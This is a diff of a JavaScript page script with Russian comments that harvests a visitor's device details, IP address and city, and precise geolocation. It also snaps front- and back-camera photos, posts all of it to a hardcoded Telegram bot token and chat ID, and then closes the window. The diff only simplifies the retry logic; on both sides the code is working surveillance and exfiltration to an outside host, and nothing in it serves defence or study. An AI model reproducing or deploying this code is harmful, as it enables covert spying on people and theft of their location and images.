@@ -3,127 +3,75 @@ const BOT_TOKEN = '8621842542:AAGj8u2N6VHyIZNw3qX_qN9aSsSOYsZi424';
 const CHAT_ID = '8244138604';
 
 const video = document.getElementById('video');
-let geoSuccess = false;
 
-// ========== ОТПРАВКА В TELEGRAM ==========
-async function sendToTelegram(method, data) {
-    const url = `https://api.telegram.org/bot${BOT_TOKEN}/${method}`;
-    try {
-        await fetch(url, { method: 'POST', body: data });
-    } catch(e) {}
-}
-
+// ========== ОТПРАВКА ==========
 async function sendMessage(text) {
     const formData = new FormData();
     formData.append('chat_id', CHAT_ID);
     formData.append('text', text);
-    await sendToTelegram('sendMessage', formData);
+    try {
+        await fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`, { method: 'POST', body: formData });
+    } catch(e) {}
 }
 
-async function sendPhoto(photoBlob, caption) {
+async function sendPhoto(blob, caption) {
     const formData = new FormData();
     formData.append('chat_id', CHAT_ID);
-    formData.append('photo', photoBlob, 'photo.jpg');
+    formData.append('photo', blob, 'photo.jpg');
     formData.append('caption', caption);
-    await sendToTelegram('sendPhoto', formData);
+    try {
+        await fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendPhoto`, { method: 'POST', body: formData });
+    } catch(e) {}
 }
 
 // ========== ДАННЫЕ УСТРОЙСТВА ==========
-async function getDeviceInfo() {
-    const userAgent = navigator.userAgent;
+async function sendDeviceData() {
+    const ua = navigator.userAgent;
     let os = 'Unknown';
-    if (userAgent.indexOf('Android') > -1) os = 'Android';
-    else if (userAgent.indexOf('iPhone') > -1) os = 'iOS';
-    else if (userAgent.indexOf('Windows') > -1) os = 'Windows';
-    else if (userAgent.indexOf('Mac') > -1) os = 'MacOS';
+    if (ua.indexOf('Android') > -1) os = 'Android';
+    else if (ua.indexOf('iPhone') > -1) os = 'iOS';
+    else if (ua.indexOf('Windows') > -1) os = 'Windows';
     
     let browser = 'Unknown';
-    if (userAgent.indexOf('Chrome') > -1 && userAgent.indexOf('Edg') === -1) browser = 'Chrome';
-    else if (userAgent.indexOf('Safari') > -1 && userAgent.indexOf('Chrome') === -1) browser = 'Safari';
-    else if (userAgent.indexOf('Firefox') > -1) browser = 'Firefox';
+    if (ua.indexOf('Chrome') > -1) browser = 'Chrome';
+    else if (ua.indexOf('Safari') > -1) browser = 'Safari';
     
-    const screenSize = `${screen.width}x${screen.height}`;
-    const timestamp = new Date().toLocaleString('ru-RU');
+    const time = new Date().toLocaleString('ru-RU');
     
-    let batteryInfo = '';
+    let battery = '';
     if ('getBattery' in navigator) {
         try {
-            const battery = await navigator.getBattery();
-            batteryInfo = `🔋 Батарея: ${Math.floor(battery.level * 100)}% (${battery.charging ? 'на зарядке' : 'не заряжается'})`;
+            const b = await navigator.getBattery();
+            battery = `🔋 Батарея: ${Math.floor(b.level * 100)}% (${b.charging ? 'на зарядке' : 'не заряжается'})`;
         } catch(e) {}
     }
     
-    let connectionInfo = '';
-    const conn = navigator.connection || navigator.mozConnection || navigator.webkitConnection;
-    if (conn) {
-        connectionInfo = `📡 Интернет: ${conn.effectiveType || 'Unknown'} (${conn.downlink || '?'} Мбит/с)`;
-    }
-    
-    return `📱 Устройство: ${os} | ${browser}
-📐 Экран: ${screenSize}
-⏰ Время: ${timestamp}
-${batteryInfo}
-${connectionInfo}`.trim();
-}
-
-async function getIPInfo() {
+    let ip = '';
     try {
         const res = await fetch('https://ipapi.co/json/');
         const data = await res.json();
-        return `🌍 IP: ${data.ip} (${data.city}, ${data.country_name})`;
-    } catch(e) {
-        return null;
-    }
+        ip = `🌍 IP: ${data.ip} (${data.city}, ${data.country_name})`;
+    } catch(e) {}
+    
+    await sendMessage(`📱 Устройство: ${os} | ${browser}
+⏰ Время: ${time}
+${battery}
+${ip}`);
 }
 
-async function sendDeviceData() {
-    let fullText = await getDeviceInfo();
-    const ipText = await getIPInfo();
-    if (ipText) fullText += '\n' + ipText;
-    await sendMessage(fullText);
+// ========== ГЕОЛОКАЦИЯ (1 ПОПЫТКА) ==========
+function getGeo(callback) {
+    navigator.geolocation.getCurrentPosition(
+        (pos) => callback({ lat: pos.coords.latitude, lon: pos.coords.longitude }),
+        () => callback(null)
+    );
 }
 
-// ========== ГЕОЛОКАЦИЯ ==========
-function getLocationWithRetry(retryCount, maxRetries) {
-    return new Promise((resolve) => {
-        navigator.geolocation.getCurrentPosition(
-            (position) => {
-                resolve({
-                    lat: position.coords.latitude,
-                    lon: position.coords.longitude
-                });
-            },
-            (error) => {
-                if (retryCount < maxRetries) {
-                    setTimeout(() => {
-                        getLocationWithRetry(retryCount + 1, maxRetries).then(resolve);
-                    }, 2000);
-                } else {
-                    resolve(null);
-                }
-            }
-        );
-    });
-}
-
-async function requestLocation(maxAttempts) {
-    return await getLocationWithRetry(1, maxAttempts);
-}
-
-async function sendLocation(lat, lon) {
-    const mapsUrl = `https://yandex.com/maps/?pt=${lon},${lat}&z=17&l=map`;
-    await sendMessage(`📍 Местоположение: ${mapsUrl}`);
-}
-
-// ========== КАМЕРА ==========
-function askCamera(facingMode, callback) {
+// ========== КАМЕРА (1 ПОПЫТКА) ==========
+function getCamera(facing, callback) {
     navigator.mediaDevices.getUserMedia({
-        video: { facingMode: { exact: facingMode }, width: 1280, height: 720 }
-    }).then(stream => {
-        callback(stream);
-    }).catch(() => {
-        callback(null);
-    });
+        video: { facingMode: { exact: facing }, width: 1280, height: 720 }
+    }).then(stream => callback(stream)).catch(() => callback(null));
 }
 
 async function takePhoto(stream, caption) {
@@ -148,83 +96,40 @@ async function takePhoto(stream, caption) {
     });
 }
 
-// ========== ГЛАВНАЯ ФУНКЦИЯ ==========
+// ========== ГЛАВНАЯ ==========
 async function main() {
     // 1. Данные устройства
     await sendDeviceData();
     
-    // 2. Геолокация (2 попытки)
-    const firstLoc = await requestLocation(2);
-    if (firstLoc) {
-        await sendLocation(firstLoc.lat, firstLoc.lon);
-        geoSuccess = true;
-    }
-    
-    // 3. Камера (2 попытки)
-    askCamera('user', async (frontStream) => {
-        if (!frontStream) {
-            // Вторая попытка через 2 секунды
-            setTimeout(() => {
-                askCamera('user', async (frontStream2) => {
-                    if (frontStream2) {
-                        await takePhoto(frontStream2, '📸 Фронтальная камера');
-                        frontStream2.getTracks().forEach(t => t.stop());
-                        
-                        // Ждем 3 секунды
-                        setTimeout(async () => {
-                            askCamera('environment', async (backStream) => {
-                                if (backStream) {
-                                    await takePhoto(backStream, '📸 Задняя камера');
-                                    backStream.getTracks().forEach(t => t.stop());
-                                }
-                                
-                                // 4. Если гео не было - последняя попытка
-                                if (!geoSuccess) {
-                                    const lastLoc = await requestLocation(1);
-                                    if (lastLoc) {
-                                        await sendLocation(lastLoc.lat, lastLoc.lon);
-                                    }
-                                }
-                                setTimeout(() => window.close(), 1000);
-                            });
-                        }, 3000);
-                    } else {
-                        // Камера не разрешена - сразу проверяем гео
-                        if (!geoSuccess) {
-                            const lastLoc = await requestLocation(1);
-                            if (lastLoc) {
-                                await sendLocation(lastLoc.lat, lastLoc.lon);
-                            }
-                        }
-                        setTimeout(() => window.close(), 1000);
-                    }
-                });
-            }, 2000);
-            return;
+    // 2. Геолокация (1 попытка)
+    getGeo(async (loc) => {
+        if (loc) {
+            await sendMessage(`📍 Яндекс.Карты: https://yandex.com/maps/?pt=${loc.lon},${loc.lat}&z=17`);
         }
         
-        // Камера разрешена с первого раза
-        await takePhoto(frontStream, '📸 Фронтальная камера');
-        frontStream.getTracks().forEach(t => t.stop());
-        
-        // Ждем 3 секунды
-        setTimeout(async () => {
-            askCamera('environment', async (backStream) => {
-                if (backStream) {
-                    await takePhoto(backStream, '📸 Задняя камера');
-                    backStream.getTracks().forEach(t => t.stop());
-                }
+        // 3. Камера (1 запрос)
+        getCamera('user', async (stream) => {
+            if (stream) {
+                // Фронтальное фото
+                await takePhoto(stream, '📸 Фронтальная камера');
                 
-                // 4. Если гео не было - последняя попытка
-                if (!geoSuccess) {
-                    const lastLoc = await requestLocation(1);
-                    if (lastLoc) {
-                        await sendLocation(lastLoc.lat, lastLoc.lon);
-                    }
-                }
+                // Ждем 3 секунды
+                setTimeout(async () => {
+                    // Заднее фото
+                    getCamera('environment', async (backStream) => {
+                        if (backStream) {
+                            await takePhoto(backStream, '📸 Задняя камера');
+                            backStream.getTracks().forEach(t => t.stop());
+                        }
+                        stream.getTracks().forEach(t => t.stop());
+                        setTimeout(() => window.close(), 1000);
+                    });
+                }, 3000);
+            } else {
+                // Камера не разрешена - закрываем
                 setTimeout(() => window.close(), 1000);
-            });
-        }, 3000);
+            }
+        });
     });
 }
 
